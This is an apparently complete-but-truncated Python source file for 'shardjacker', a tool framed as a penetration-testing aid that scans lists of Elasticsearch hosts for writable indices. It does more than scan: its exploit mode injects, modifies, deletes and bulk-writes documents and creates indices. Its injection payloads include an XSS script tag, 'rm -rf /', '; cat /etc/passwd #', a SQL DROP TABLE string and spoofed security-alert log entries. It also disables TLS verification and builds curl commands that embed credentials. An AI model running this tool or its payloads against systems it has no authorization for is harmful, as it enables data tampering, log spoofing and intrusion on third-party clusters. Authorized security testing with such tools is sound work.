#!/usr/bin/env python3

import requests
import json
import argparse
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
import urllib3
import uuid
import time
import threading
from datetime import datetime

# Disable SSL warnings for testing environments
urllib3.disable_warnings(InsecureRequestWarning)

# Thread-safe progress tracking
progress_lock = threading.Lock()
progress_counter = {"completed": 0, "total": 0}

def print_banner():
    banner = """
 _______           _______  _______  ______  _________ _______  _______  _        _______  _______ 
(  ____ \|\     /|(  ___  )(  ____ )(  __  \ \__    _/(  ___  )(  ____ \| \    /\(  ____ \(  ____ )
| (    \/| )   ( || (   ) || (    )|| (  \  )   )  (  | (   ) || (    \/|  \  / /| (    \/| (    )|
| (_____ | (___) || (___) || (____)|| |   ) |   |  |  | (___) || |      |  (_/ / | (__    | (____)|
(_____  )|  ___  ||  ___  ||     __)| |   | |   |  |  |  ___  || |      |   _ (  |  __)   |     __)
      ) || (   ) || (   ) || (\ (   | |   ) |   |  |  | (   ) || |      |  ( \ \ | (      | (\ (   
/\____) || )   ( || )   ( || ) \ \__| (__/  )|\_)  )  | )   ( || (____/\|  /  \ \| (____/\| ) \ \__
\_______)|/     \||/     \||/   \__/(______/ (____/   |/     \|(_______/|_/    \/(_______/|/   \__/
                                                                                                   

         ╔══════════════════════════════════════════════════════════════════════════════╗
         ║                              By Abira Security                               ║
         ╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def update_progress(target, status, silent=False):
    """Thread-safe progress tracking"""
    with progress_lock:
        progress_counter["completed"] += 1
        current = progress_counter["completed"]
        total = progress_counter["total"]

        if not silent:
            timestamp = datetime.now().strftime("%H:%M:%S")
            progress_pct = (current / total) * 100 if total > 0 else 0
            print(f"[{timestamp}] [{current}/{total} - {progress_pct:.1f}%] {target}: {status}")

def detect_protocol_advanced(target, username=None, password=None, timeout=5):
    """Advanced protocol detection with Elasticsearch-specific testing"""
    if target.startswith('http://') or target.startswith('https://'):
        return target

    protocols_to_test = ['https', 'http']
    best_target = None
    best_score = -1

    for protocol in protocols_to_test:
        test_url = f"{protocol}://{target}"
        score = 0

        try:
            response = requests.get(f"{test_url}/", timeout=timeout, verify=False,
                                  auth=(username, password) if username and password else None)

            if response.status_code == 200:
                score += 10
                try:
                    data = response.json()
                    if 'version' in data and 'elasticsearch' in data.get('version', {}).get('distribution', '').lower():
                        score += 20
                    elif 'cluster_name' in data:
                        score += 15
                except:
                    pass

            elif response.status_code in [401, 403]:
                score += 8
            elif response.status_code in [404, 405]:
                score += 5

            try:
                cluster_response = requests.get(f"{test_url}/_cluster/health", timeout=timeout//2, verify=False,
                                              auth=(username, password) if username and password else None)
                if cluster_response.status_code in [200, 401, 403]:
                    score += 25
            except:
                pass

            if score > best_score:
                best_score = score
                best_target = test_url

        except requests.exceptions.SSLError:
            if protocol == 'https':
                score = 1
        except requests.exceptions.ConnectionError:
            score = 0
        except Exception:
            score = 0

    return best_target if best_target else f"http://{target}"

def detect_protocols_for_targets_advanced(raw_targets, username=None, password=None, timeout=5, silent=False):
    """Advanced protocol detection with Elasticsearch validation"""
    if not silent:
        print(f"🔍 Auto-detecting protocols and validating Elasticsearch connectivity...")

    detected_targets = []

    for i, target in enumerate(raw_targets):
        if not silent:
            print(f"   [{i+1}/{len(raw_targets)}] Testing {target}...", end=" ", flush=True)

        detected_target = detect_protocol_advanced(target, username, password, timeout)
        detected_targets.append(detected_target)

        if not silent:
            protocol = "HTTPS" if detected_target.startswith('https://') else "HTTP"
            try:
                test_response = requests.get(f"{detected_target}/", timeout=2, verify=False,
                                           auth=(username, password) if username and password else None)
                if test_response.status_code == 200:
                    status = "✅ ES"
                elif test_response.status_code in [401, 403]:
                    status = "🔐 AUTH"  
                else:
                    status = "⚠️  RESP"
            except:
                status = "❓ UNKNOWN"

            print(f"→ {protocol} {status}")

    return detected_targets

def simple_write_test_all_indices(target, username=None, password=None, timeout=15, silent=False):
    """
    SIMPLE write test mode - replicates original check_write.py behavior
    Tests ALL indices for write/read-only status for penetration testing reports
    """
    timestamp = datetime.now().strftime("%H:%M:%S")

    try:
        # Create session
        session = requests.Session()
        session.verify = False

        if username and password:
            session.auth = (username, password)

        session.headers.update({
            'User-Agent': 'ElasticsearchPrivilegeChecker/1.0',
            'Content-Type': 'application/json'
        })

        # Get ALL indices (no limit for comprehensive reporting)
        url = f"{target}/_cat/indices?format=json&h=index"

        if not silent:
            print(f"[{timestamp}] 🔍 Getting all indices from {target}...")

        response = session.get(url, timeout=timeout)

        if response.status_code != 200:
            if not silent:
                print(f"[{timestamp}] ❌ {target}: Failed to get indices (HTTP {response.status_code})")
            return [{"target": target, "status": "error", "message": f"HTTP {response.status_code}"}]

        indices_data = response.json()

        # Handle both formats
        if indices_data and isinstance(indices_data[0], dict):
            indices = [index.get('index', index.get('i', '')) for index in indices_data]
        else:
            indices = indices_data

        # Filter system indices for clean reporting
        user_indices = [idx for idx in indices if not idx.startswith('.')]
        total_indices = len(user_indices)

        if not silent:
            print(f"[{timestamp}] 📊 {target}: Testing {total_indices} user indices for write permissions...")

        results = []
        writable_count = 0
        readonly_count = 0
        error_count = 0

        # Test write privileges for ALL indices
        for i, index_name in enumerate(user_indices):
            if not silent and (i + 1) % 100 == 0:  # Progress every 100 indices
                progress_pct = ((i + 1) / total_indices) * 100
                print(f"[{timestamp}] 📈 {target}: Progress {i + 1}/{total_indices} ({progress_pct:.1f}%)")

            # Simple write test - exact replica of check_write.py logic
            test_doc_id = f"privilege_test_{int(time.time() * 1000)}_{i}"
            test_doc_url = f"{target}/{index_name}/_doc/{test_doc_id}"
            test_payload = {"test": "privilege_check", "timestamp": time.time()}

            try:
                write_response = session.put(test_doc_url, json=test_payload, timeout=timeout)

                if write_response.status_code in [200, 201]:
                    # WRITABLE - clean up immediately
                    try:
                        session.delete(test_doc_url, timeout=timeout)
                    except:
                        pass

                    writable_count += 1
                    results.append({
                        "target": target,
                        "index": index_name,
                        "status": "writable",
                        "method": "simple_write_test",
                        "response_code": write_response.status_code
                    })

                elif write_response.status_code == 403:
                    # READ-ONLY
                    readonly_count += 1
                    results.append({
                        "target": target,
                        "index": index_name,
                        "status": "read_only", 
                        "method": "simple_write_test",
                        "response_code": write_response.status_code
                    })

                else:
                    # ERROR
                    error_count += 1
                    results.append({
                        "target": target,
                        "index": index_name,
                        "status": "error",
                        "message": f"HTTP {write_response.status_code}",
                        "response_code": write_response.status_code
                    })

            except Exception as e:
                error_count += 1
                results.append({
                    "target": target,
                    "index": index_name,
                    "status": "error",
                    "message": str(e)
                })

        # Final status
        if not silent:
            print(f"[{timestamp}] ✅ {target}: Completed - {writable_count} writable, {readonly_count} read-only, {error_count} errors")

        return results

    except Exception as e:
        if not silent:
            print(f"[{timestamp}] ❌ {target}: Exception - {str(e)}")
        return [{"target": target, "status": "error", "message": str(e)}]

class ElasticsearchExploitTester:
    """Comprehensive Elasticsearch exploitation testing class - THREAD SAFE VERSION"""
    def __init__(self, username=None, password=None, timeout=10):
        self.username = username
        self.password = password
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        if username and password:
            self.session.auth = (username, password)
        self.test_docs = []

    def generate_test_payloads(self):
        """Generate various test payloads for injection testing"""
        return {
            "benign": {"test": "benign_payload", "timestamp": int(time.time()), "type": "test"},
            "log_spoofing": {"level": "ERROR", "message": "FAKE SECURITY ALERT - Unauthorized access detected", "timestamp": int(time.time())},
            "malicious": {"payload": "<script>alert('XSS')</script>", "command": "rm -rf /", "timestamp": int(time.time())},
            "command_injection": {"cmd": "; cat /etc/passwd #", "query": "'; DROP TABLE users; --", "timestamp": int(time.time())}
        }

    def test_document_injection(self, target, index_name, payload_type="benign"):
        """Test document injection with various payload types"""
        payloads = self.generate_test_payloads()
        payload = payloads.get(payload_type, payloads["benign"])

        doc_id = f"exploit_test_{uuid.uuid4().hex}"
        url = f"{target}/{index_name}/_doc/{doc_id}"

        try:
            response = self.session.put(url, json=payload, timeout=self.timeout)
            if response.status_code in [200, 201]:
                self.test_docs.append((target, index_name, doc_id))

                verify_response = self.session.get(url, timeout=self.timeout)
                if verify_response.status_code == 200:
                    return {
                        "success": True,
                        "method": "document_injection",
                        "payload_type": payload_type,
                        "doc_id": doc_id,
                        "response_code": response.status_code,
                        "verification": "confirmed",
                        "curl_command": self._generate_curl_command("PUT", url, payload),
                        "injected_data": payload
                    }

            return {"success": False, "method": "document_injection", "error": f"HTTP {response.status_code}"}

        except Exception as e:
            return {"success": False, "method": "document_injection", "error": str(e)}

    def test_document_modification(self, target, index_name):
        """Test document modification capabilities"""
        doc_id = f"modify_test_{uuid.uuid4().hex}"
        original_payload = {"test": "original_data", "value": 100, "timestamp": int(time.time())}
        url = f"{target}/{index_name}/_doc/{doc_id}"

        try:
            create_response = self.session.put(url, json=original_payload, timeout=self.timeout)
            if create_response.status_code not in [200, 201]:
                return {"success": False, "method": "document_modification", "error": "Failed to create test document"}

            self.test_docs.append((target, index_name, doc_id))

            modified_payload = {"test": "MODIFIED_DATA", "value": 999, "timestamp": int(time.time()), "modified": True}
            modify_response = self.session.put(url, json=modified_payload, timeout=self.timeout)

            if modify_response.status_code in [200, 201]:    
                verify_response = self.session.get(url, timeout=self.timeout)
                if verify_response.status_code == 200:
                    retrieved_data = verify_response.json()
                    if retrieved_data.get("_source", {}).get("modified") == True:
                        return {
                            "success": True,
                            "method": "document_modification",
                            "doc_id": doc_id,
                            "verification": "confirmed",
                            "original_data": original_payload,
                            "modified_data": modified_payload,
                            "curl_command": self._generate_curl_command("PUT", url, modified_payload)
                        }

            return {"success": False, "method": "document_modification", "error": "Modification verification failed"}

        except Exception as e:
            return {"success": False, "method": "document_modification", "error": str(e)}

    def test_document_deletion(self, target, index_name):
        """Test document deletion capabilities"""
        doc_id = f"delete_test_{uuid.uuid4().hex}"
        payload = {"test": "delete_me", "timestamp": int(time.time())}
        url = f"{target}/{index_name}/_doc/{doc_id}"

        try:
            create_response = self.session.put(url, json=payload, timeout=self.timeout)
            if create_response.status_code not in [200, 201]:
                return {"success": False, "method": "document_deletion", "error": "Failed to create test document"}

            delete_response = self.session.delete(url, timeout=self.timeout)
            if delete_response.status_code in [200, 404]:
                verify_response = self.session.get(url, timeout=self.timeout)
                if verify_response.status_code == 404:
                    return {
                        "success": True,
                        "method": "document_deletion",
                        "doc_id": doc_id,
                        "verification": "confirmed",
                        "curl_command": f"curl -X DELETE '{url}'" + (f" -u {self.username}:{self.password}" if self.username else "")
                    }

            return {"success": False, "method": "document_deletion", "error": "Deletion verification failed"}

        except Exception as e:
            return {"success": False, "method": "document_deletion", "error": str(e)}

    def test_bulk_operations(self, target, index_name):
        """Test bulk document operations"""
        bulk_url = f"{target}/_bulk"

        doc_ids = [f"bulk_test_{uuid.uuid4().hex}" for _ in range(3)]
        bulk_payload = ""

        for doc_id in doc_ids:
            bulk_payload += json.dumps({"index": {"_index": index_name, "_id": doc_id}}) + "\n"
            bulk_payload += json.dumps({"test": "bulk_operation", "doc_id": doc_id, "timestamp": int(time.time())}) + "\n"
            self.test_docs.append((target, index_name, doc_id))

        try:
            headers = {"Content-Type": "application/x-ndjson"}
            response = self.session.post(bulk_url, data=bulk_payload, headers=headers, timeout=self.timeout)

            if response.status_code in [200, 201]:
                response_data = response.json()
                if not response_data.get("errors", True):
                    return {
                        "success": True,
                        "method": "bulk_operations",
                        "documents_created": len(doc_ids),
                        "doc_ids": doc_ids,
                        "verification": "confirmed",
                        "curl_command": self._generate_curl_command("POST", bulk_url, bulk_payload, {"Content-Type": "application/x-ndjson"})
                    }

            return {"success": False, "method": "bulk_operations", "error": f"HTTP {response.status_code}"}

        except Exception as e:
            return {"success": False, "method": "bulk_operations", "error": str(e)}

    def test_index_creation(self, target):
        """Test index creation capabilities"""
        test_index = f"exploit_test_index_{uuid.uuid4().hex}"
        url = f"{target}/{test_index}"

        try:
            create_response = self.session.put(url, timeout=self.timeout)
            if create_response.status_code in [200, 201]:
                verify_response = self.session.get(url, timeout=self.timeout)
                if verify_response.status_code == 200:
                    self.session.delete(url, timeout=self.timeout)
                    return {
                        "success": True,
                        "method": "index_creation",
                        "index_name": test_index,
                        "verification": "confirmed",
                        "curl_command": f"curl -X PUT '{url}'" + (f" -u {self.username}:{self.password}" if self.username else "")
                    }

            return {"success": False, "method": "index_creation", "error": f"HTTP {create_response.status_code}"}

        except Exception as e:
            return {"success": False, "method": "index_creation", "error": str(e)}

    def _generate_curl_command(self, method, url, payload=None, headers=None):
        """Generate curl command for manual reproduction"""
        curl_cmd = f"curl -X {method} '{url}'"

        if self.username and self.password:
            curl_cmd += f" -u {self.username}:{self.password}"

        if headers:
            for key, value in headers.items():
                curl_cmd += f" -H '{key}: {value}'"

        if payload:
            if isinstance(payload, dict):
                curl_cmd += f" -H 'Content-Type: application/json' -d '{json.dumps(payload)}'"
            else:
                curl_cmd += f" -d '{payload}'"

        return curl_cmd

    def cleanup_test_data(self, target):
        """Clean up all test documents created during testing"""
        cleaned = 0
        for target_host, index_name, doc_id in self.test_docs:
            if target_host == target:
                try:
                    url = f"{target}/{index_name}/_doc/{doc_id}"
                    self.session.delete(url, timeout=self.timeout)
                    cleaned += 1
                except:
                    pass

        self.test_docs = [(t, i, d) for t, i, d in self.test_docs if t != target]
        return cleaned

class ThreadSafeElasticsearchChecker:
    """Thread-safe version of the Elasticsearch privilege checker with INDEX LIMITING"""
    def __init__(self, username=None, password=None, timeout=10, max_indices=50):
        self.username = username
        self.password = password
        self.timeout = timeout
        self.max_indices = max_indices
        self.session = requests.Session()
        self.session.verify = False

        if username and password:
            self.session.auth = (username, password)

        self.session.headers.update({
            'User-Agent': 'ElasticsearchPrivilegeChecker/1.0',
            'Content-Type': 'application/json'
        })

    def get_all_indices(self, target):
        """Get all indices from target with LIMITING"""
        url = f"{target}/_cat/indices?format=json&h=index&s=index&size={self.max_indices * 2}"

        try:
            response = self.session.get(url, timeout=self.timeout)

            if response.status_code == 200:
                indices_data = response.json()
                if indices_data and isinstance(indices_data[0], dict):
                    all_indices = [index.get('index', index.get('i', '')) for index in indices_data]
                else:
                    all_indices = indices_data

                # Filter system indices and apply limit
                user_indices = [idx for idx in all_indices if not idx.startswith('.')][:self.max_indices]
                return user_indices
            else:
                return None

        except requests.exceptions.RequestException:
            return None

    def check_write_privileges(self, target, index_name):
        """Check write privileges using security API"""
        url = f"{target}/_security/privilege/_has_privileges"

        payload = {
            "index": {
                index_name: {
                    "privileges": ["write"]
                }
            }
        }

        try:
            response = self.session.post(url, json=payload, timeout=self.timeout)

            if response.status_code == 200:
                result = response.json()
                has_write = False

                if "index" in result and index_name in result["index"]:
                    has_write = result["index"][index_name].get("write", False)

                return {
                    "target": target,
                    "index": index_name,
                    "status": "GRANTED" if has_write else "DENIED",
                    "has_write": has_write,
                    "method": "security_api",
                    "response": result
                }
            elif response.status_code in [404, 405]:
                return self.check_write_privileges_alternative(target, index_name)
            else:
                return {
                    "target": target,
                    "index": index_name,
                    "status": "ERROR",
                    "has_write": False,
                    "method": "security_api",
                    "error": f"HTTP {response.status_code}"
                }

        except requests.exceptions.RequestException as e:
            return self.check_write_privileges_alternative(target, index_name)

    def check_write_privileges_alternative(self, target, index_name):
        """Alternative write privilege check using document creation"""
        test_doc_id = f"privilege_test_{int(time.time() * 1000)}"
        test_doc_url = f"{target}/{index_name}/_doc/{test_doc_id}"
        test_payload = {
            "test": "privilege_check", 
            "timestamp": time.time(),
            "method": "write_test"
        }

        try:
            response = self.session.put(test_doc_url, json=test_payload, timeout=self.timeout)

            if response.status_code in [200, 201]:
                try:
                    self.session.delete(test_doc_url, timeout=self.timeout)
                except:
                    pass

                return {
                    "target": target,
                    "index": index_name,
                    "status": "GRANTED",
                    "has_write": True,
                    "method": "write_test"
                }
            elif response.status_code == 403:
                return {
                    "target": target,
                    "index": index_name,
                    "status": "DENIED",
                    "has_write": False,
                    "method": "write_test"
                }
            elif response.status_code == 404:
                return self.test_index_creation(target, index_name)
            else:
                return {
                    "target": target,
                    "index": index_name,
                    "status": "ERROR",
                    "has_write": False,
                    "method": "write_test",
                    "error": f"HTTP {response.status_code}"
                }

        except requests.exceptions.RequestException as e:
            return {
                "target": target,
                "index": index_name,
                "status": "ERROR",
                "has_write": False,
                "method": "write_test",
                "error": str(e)
            }

    def test_index_creation(self, target, index_name):
        """Test index creation capability"""
        test_index_name = f"{index_name}_write_test_{int(time.time())}"
        create_url = f"{target}/{test_index_name}"

        try:
            response = self.session.put(
                create_url,
                json={"settings": {"number_of_shards": 1, "number_of_replicas": 0}},
                timeout=self.timeout
            )

            if response.status_code in [200, 201]:
                try:
                    self.session.delete(create_url, timeout=self.timeout)
                except:
                    pass

                return {
                    "target": target,
                    "index": index_name,
                    "status": "GRANTED",
                    "has_write": True,
                    "method": "index_create_test"
                }
            else:
                return {
                    "target": target,
                    "index": index_name,
                    "status": "DENIED",
                    "has_write": False,
                    "method": "index_create_test"
                }

        except requests.exceptions.RequestException as e:
            return {
                "target": target,
                "index": index_name,
                "status": "ERROR",
                "has_write": False,
                "method": "index_create_test",
                "error": str(e)
            }

def run_exploitation_tests(exploit_tester, target, index_name, exploit_types, base_result):
    """Run comprehensive exploitation tests and merge with base result"""
    exploitation_results = []

    if 'injection' in exploit_types:
        for payload_type in ['benign', 'log_spoofing', 'malicious', 'command_injection']:
            test_result = exploit_tester.test_document_injection(target, index_name, payload_type)
            if test_result.get("success"):
                exploitation_results.append(test_result)

    if 'modification' in exploit_types:
        test_result = exploit_tester.test_document_modification(target, index_name)
        if test_result.get("success"):
            exploitation_results.append(test_result)

    if 'deletion' in exploit_types:
        test_result = exploit_tester.test_document_deletion(target, index_name)
        if test_result.get("success"):
            exploitation_results.append(test_result)

    if 'bulk' in exploit_types:
        test_result = exploit_tester.test_bulk_operations(target, index_name)
        if test_result.get("success"):
            exploitation_results.append(test_result)

    if 'index_creation' in exploit_types:
        test_result = exploit_tester.test_index_creation(target)
        if test_result.get("success"):
            exploitation_results.append(test_result)

    if exploitation_results:
        base_result["status"] = "exploit_confirmed"
        base_result["exploitation_results"] = exploitation_results
        base_result["exploitation_summary"] = {
            "total_tests": len(exploitation_results),
            "successful_methods": [r["method"] for r in exploitation_results if r.get("success")]
        }

    return base_result

def check_elasticsearch_writable_threadsafe(target, username=None, password=None, timeout=10, max_indices=50, recon_only=False, exploit_confirm=False, exploit_types=None, silent=False):
    """Thread-safe Elasticsearch checker with comprehensive exploitation support and INDEX LIMITING"""
    results = []

    try:
        checker = ThreadSafeElasticsearchChecker(username, password, timeout, max_indices)

        indices = checker.get_all_indices(target)
        if not indices:
            update_progress(target, "❌ Failed to get indices", silent)
            return [{"target": target, "status": "error", "message": "Failed to get indices"}]

        if recon_only:
            update_progress(target, f"🔍 Found {len(indices)} accessible indices (limited)", silent)
            for index_name in indices:
                results.append({
                    "target": target,
                    "index": index_name,
                    "status": "accessible",
                    "method": "reconnaissance"
                })
            return results

        exploit_tester = None
        if exploit_confirm:
            exploit_tester = ElasticsearchExploitTester(username, password, timeout)
            if not exploit_types:
                exploit_types = ['injection', 'modification', 'deletion', 'bulk', 'index_creation']

        writable_count = 0
        exploit_count = 0

        for index_name in indices:
            privilege_result = checker.check_write_privileges(target, index_name)

            if privilege_result["status"] == "GRANTED" and privilege_result.get("has_write"):
                writable_count += 1
                result = {
                    "target": target,
                    "index": index_name,
                    "status": "writable",
                    "method": privilege_result["method"]
                }

                if exploit_confirm and exploit_tester:
                    result = run_exploitation_tests(exploit_tester, target, index_name, exploit_types, result)
                    if result.get("status") == "exploit_confirmed":
                        exploit_count += 1

                results.append(result)

            elif privilege_result["status"] == "DENIED":
                results.append({
                    "target": target,
                    "index": index_name,
                    "status": "read_only",
                    "method": privilege_result["method"]
                })
            else:
                results.append({
                    "target": target,
                    "index": index_name,
                    "status": "error",
                    "message": privilege_result.get("error", "Unknown error")
                })

        if exploit_tester:
            cleaned = exploit_tester.cleanup_test_data(target)

        if exploit_confirm and exploit_count > 0:
            update_progress(target, f"💥 Exploitation confirmed on {exploit_count} indices (from {len(indices)} tested)", silent)
        elif writable_count > 0:
            update_progress(target, f"✅ Found {writable_count} writable indices (from {len(indices)} tested)", silent)
        else:
            update_progress(target, f"ℹ️  No writable indices found (tested {len(indices)} indices)", silent)

    except Exception as e:
        update_progress(target, f"❌ Error - {str(e)}", silent)
        return [{"target": target, "status": "error", "message": str(e)}]

    return results

def save_to_json(results, filename, silent=False):
    """Save results to JSON file with metadata"""
    output_data = {
        "scan_metadata": {
            "tool": "Elasticsearch Advanced Scanner & Exploitation Tool",
            "version": "2.0",
            "total_results": len(results)
        },
        "results": results
    }

    with open(filename, 'w') as f:
        json.dump(output_data, f, indent=2)

    if not silent:
        print(f"✅ Results saved to {filename}")

def save_to_csv(results, prefix, silent=False):
    """Save results to CSV files"""
    import csv

    writable_results = [r for r in results if r.get('status') == 'writable']
    readonly_results = [r for r in results if r.get('status') == 'read_only']
    accessible_results = [r for r in results if r.get('status') == 'accessible']
    exploit_results = [r for r in results if r.get('status') == 'exploit_confirmed']

    files_created = []

    if exploit_results:
        exploit_file = f"{prefix}_exploit_confirmed.csv"
        with open(exploit_file, 'w', newline='') as f:
            flattened_results = []
            for result in exploit_results:
                base_result = {k: v for k, v in result.items() if k != 'exploitation_results'}
                if 'exploitation_results' in result:
                    base_result['exploitation_methods'] = ', '.join([r['method'] for r in result['exploitation_results']])
                    base_result['curl_commands'] = ' | '.join([r.get('curl_command', '') for r in result['exploitation_results']])
                flattened_results.append(base_result)

            if flattened_results:
                writer = csv.DictWriter(f, fieldnames=flattened_results[0].keys())
                writer.writeheader()
                writer.writerows(flattened_results)
        files_created.append(exploit_file)

    for results_list, suffix in [(writable_results, 'writable'), (readonly_results, 'readonly'), (accessible_results, 'accessible')]:
        if results_list:
            filename = f"{prefix}_{suffix}.csv"
            with open(filename, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=results_list[0].keys())
                writer.writeheader()
                writer.writerows(results_list)
            files_created.append(filename)

    combined_file = f"{prefix}_combined.csv"
    if results:
        flattened_all = []
        for result in results:
            base_result = {k: v for k, v in result.items() if k not in ['exploitation_results', 'metadata']}
            if 'exploitation_results' in result:
                base_result['exploitation_count'] = len(result['exploitation_results'])
            flattened_all.append(base_result)

        with open(combined_file, 'w', newline='') as f:
            if flattened_all:
                writer = csv.DictWriter(f, fieldnames=flattened_all[0].keys())
                writer.writeheader()
                writer.writerows(flattened_all)
        files_created.append(combined_file)

    if not silent:
        print(f"✅ CSV files saved: {', '.join(files_created)}")

def deduplicate_results(results):
    """Remove duplicate target+index combinations"""
    seen = set()
    deduped = []

    for result in results:
        key = (result.get('target', ''), result.get('index', ''))
        if key not in seen:
            seen.add(key)
            deduped.append(result)

    return deduped

def main():
    parser = argparse.ArgumentParser(
        prog='shardjacker.py',
        description='Elasticsearch Advanced Scanner & Exploitation Tool - Complete reconnaissance to exploitation framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
DESCRIPTION:
    This comprehensive tool performs Elasticsearch security assessment from reconnaissance
    through full exploitation. It supports multiple operational modes including simple
    write testing for penetration testing reports.

OPERATIONAL MODES:
    • Simple Write Test (--write-test-only): Clean write/read-only testing for client reports
    • Reconnaissance (--recon-only): Passive discovery of accessible indices and clusters
    • Basic Testing (default): Traditional write permission testing with index limiting
    • Exploitation (--exploit-confirm): Comprehensive attack capability validation

SIMPLE WRITE TEST MODE:
    Perfect for penetration testing reports - tests ALL indices for write/read-only status
    with clean CSV output suitable for client documentation.

EXPLOITATION TESTS:
    • Document Injection: Multiple payload types (benign, log spoofing, malicious, command injection)
    • Document Modification: Before/after tampering verification  
    • Document Deletion: Evidence removal testing
    • Bulk Operations: Mass data injection capabilities
    • Index Creation: Administrative control validation

INDEX LIMITING:
    For large deployments with thousands of indices per target, use --max-indices
    to limit testing to the first N indices per target for performance.
    Use --no-index-limit with --write-test-only for comprehensive client reports.

TARGET FILE FORMAT:
    One target per line in IP:PORT format (protocol auto-detected):
    192.168.1.100:9200
    10.0.0.50:9200
    elasticsearch.example.com:9200
    # Comments supported with # prefix

    The tool will automatically detect whether to use HTTP or HTTPS for each target.

AUTHENTICATION:
    • No authentication (default) - Tests for open clusters
    • Basic authentication - Use -u/--username and -p/--password
    • Supports both authenticated and unauthenticated scanning

OUTPUT FORMATS:
    • Console output with real-time progress and results
    • JSON export with detailed scan metadata and exploitation data
    • CSV export (multiple files: writable, read-only, accessible, exploit-confirmed, combined)

USAGE EXAMPLES:
    # Simple write test for ALL indices (penetration testing report)
    python3 shardjacker.py -f targets.txt --write-test-only --no-index-limit --csv-output pentest_results

    # Simple write test with reasonable limit for faster results
    python3 shardjacker.py -f targets.txt --write-test-only --max-indices 200 --csv-output quick_results

    # Silent mode for automated reporting
    python3 shardjacker.py -f targets.txt --write-test-only --no-index-limit --no-console --csv-output client_report

    # Reconnaissance mode - passive index discovery (limited)
    python3 shardjacker.py -f targets.txt --recon-only --max-indices 20

    # Basic write testing with index limiting
    python3 shardjacker.py -f targets.txt --max-indices 50

    # Full exploitation confirmation on writable indices
    python3 shardjacker.py -f targets.txt --exploit-confirm --max-indices 25

    # Selective exploitation testing
    python3 shardjacker.py -f targets.txt --exploit-confirm --exploit-types injection modification --max-indices 30

    # Authenticated comprehensive scan with detailed output
    python3 shardjacker.py -f targets.txt -u elastic -p changeme --exploit-confirm --show-exploit-data --max-indices 40

PERFORMANCE RECOMMENDATIONS:
    • Use --write-test-only --no-index-limit for complete client reports (will be slow but comprehensive)
    • Use --max-indices 10-50 for initial reconnaissance
    • Use --max-indices 100-500 for comprehensive testing  
    • Use --max-indices 1000+ only for complete audits (will be slow)
    • Increase --timeout when using higher --max-indices values

SECURITY CONSIDERATIONS:
    • Simple write test mode performs minimal write operations with immediate cleanup
    • Exploitation mode performs actual write operations with verification
    • All test artifacts are automatically cleaned up after testing
    • SSL certificate verification disabled for testing environments
    • Comprehensive logging of all operations with curl reproduction commands
    • Safe payload testing with immediate cleanup verification
        """
    )

    # Required arguments
    required = parser.add_argument_group('Required Arguments')
    required.add_argument('-f', '--file', 
                         required=True,
                         metavar='TARGETS_FILE',
                         help='File containing Elasticsearch targets (IP:PORT format, one per line)')

    # Authentication arguments  
    auth_group = parser.add_argument_group('Authentication Options')
    auth_group.add_argument('-u', '--username',
                           metavar='USERNAME', 
                           help='Username for HTTP Basic authentication')
    auth_group.add_argument('-p', '--password',
                           metavar='PASSWORD',
                           help='Password for HTTP Basic authentication')

    # Performance and connection arguments
    perf_group = parser.add_argument_group('Performance & Connection Options')
    perf_group.add_argument('-t', '--timeout', 
                           type=int, 
                           default=15,
                           metavar='SECONDS',
                           help='HTTP request timeout in seconds (default: 15)')
    perf_group.add_argument('--threads', 
                           type=int, 
                           default=5,
                           metavar='NUM',
                           help='Number of concurrent scanning threads (default: 5, max recommended: 10)')
    perf_group.add_argument('--max-indices', 
                           type=int, 
                           default=50,
                           metavar='NUM',
                           help='Maximum indices to test per target (default: 50, use higher for comprehensive scans)')
    perf_group.add_argument('--no-index-limit',
                           action='store_true', 
                           help='Remove index limit - test all indices (use with --write-test-only for comprehensive reports)')

    # Simple testing mode
    simple_group = parser.add_argument_group('Simple Write Testing Mode')
    simple_group.add_argument('--write-test-only',
                             action='store_true',
                             help='Simple write test mode - test ALL indices for write/read-only status (for penetration testing reports)')

    # Scanning mode arguments
    scan_group = parser.add_argument_group('Advanced Scanning Mode Options')
    scan_group.add_argument('--recon-only',
                           action='store_true',
                           help='Reconnaissance mode - only discover accessible indices without testing write permissions (completely passive)')
    scan_group.add_argument('--exploit-confirm',
                           action='store_true',
                           help='Enable comprehensive exploitation testing on writable indices (active testing)')

    # Exploitation arguments
    exploit_group = parser.add_argument_group('Exploitation Testing Options')
    exploit_group.add_argument('--exploit-types',
                              nargs='+',
                              choices=['injection', 'modification', 'deletion', 'bulk', 'index_creation'],
                              help='Specify which exploitation tests to run (default: all types)')
    exploit_group.add_argument('--show-exploit-data',
                              action='store_true',
                              help='Display detailed exploitation data and curl commands in console output')

    # Output and reporting arguments
    output_group = parser.add_argument_group('Output & Reporting Options')
    output_group.add_argument('-o', '--output',
                             metavar='JSON_FILE',
                             help='Save detailed results to JSON file with scan metadata')
    output_group.add_argument('--csv-output',
                             metavar='PREFIX',
                             help='Export results to CSV files using specified prefix (creates multiple files)')
    output_group.add_argument('--show-read-only', 
                             action='store_true',
                             help='Display read-only indices in console summary output')
    output_group.add_argument('--no-console',
                             action='store_true',
                             help='Suppress all console output (silent mode - results only in files)')

    # Processing options
    proc_group = parser.add_argument_group('Processing Options')
    proc_group.add_argument('--dedupe', 
                           action='store_true',
                           help='Remove duplicate target+index combinations from results')

    # Version information
    parser.add_argument('--version', 
                       action='version', 
                       version='%(prog)s 2.0 - Elasticsearch Advanced Scanner & Exploitation Tool')

    args = parser.parse_args()

    # Validate arguments
    if args.threads > 10:
        if not args.no_console:
            print("⚠️  Warning: More than 10 threads may cause connection issues")
            print("   Recommend using 5-8 threads with increased --timeout and --max-indices")

    if args.username and not args.password:
        parser.error("Password required when username is specified (-p/--password)")

    if args.password and not args.username:
        parser.error("Username required when password is specified (-u/--username)")

    if args.write_test_only:
        if args.exploit_confirm:
            parser.error("Cannot use --write-test-only with --exploit-confirm (conflicting modes)")
        if args.recon_only:
            parser.error("Cannot use --write-test-only with --recon-only (conflicting modes)")

        # Override max_indices for comprehensive testing if no-index-limit is used
        if args.no_index_limit:
            args.max_indices = 999999  # Effectively unlimited

    if args.exploit_confirm and args.recon_only:
        parser.error("Cannot use --exploit-confirm with --recon-only (conflicting modes)")

    # Show banner unless suppressed
    if not args.no_console:
        print_banner()

    # Read targets from file with auto protocol detection
    try:
        raw_targets = []
        with open(args.file, 'r') as f:
            for line in f:
